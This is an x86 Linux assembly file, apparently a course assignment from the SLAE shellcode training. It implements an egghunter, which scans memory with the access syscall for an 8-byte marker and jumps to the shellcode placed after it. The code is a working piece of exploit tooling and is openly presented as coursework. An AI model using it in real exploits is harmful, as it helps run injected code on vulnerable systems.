; Marcos Serrano
; egghunter.nasm
; SLAE Assignment 1
; SLAE - 1501


; plan
; load page address 4096 * x
; attempt to access syscall 33
; if non accessible, next page,
; else check for egg
; increment by one
; check again....
; on fail go to next page and repeat


global _start:

section .text

_start:

	xor ecx, ecx ; leave as 0 for access syscall mode param
	xor edi, edi ; will be used for current mem address
	mov esi, 0x41414141 ; egg is AAAAAAAA (cmp twice)
	xor edx, edx ; will hold page_size for linux

	mov dx, 0xfff  ; 4095(page size - 1)

next_page:
	or edi, edx  ; set edx to next page -1
next_byte:
	inc edi      ; adjust to next page

	xor eax, eax
	mov al, 0x21  ; 33 for access syscall
	mov ebx, edi  ; address to load

	int 0x80

	cmp al, 0xf2 ; compare return code with EFAULT
				 ; address outside your accessible space
	je next_page ; EFAULT so move to next page

check_egg:
	test esi, esi         ; clear zero flag
	cmp esi, [edi]
	jne next_byte  ; jmp if first half of egg not found
	cmp esi, [edi+4]
	jne next_byte  ; jmp if second half of egg not found
	add edi, 0x8
	jmp edi
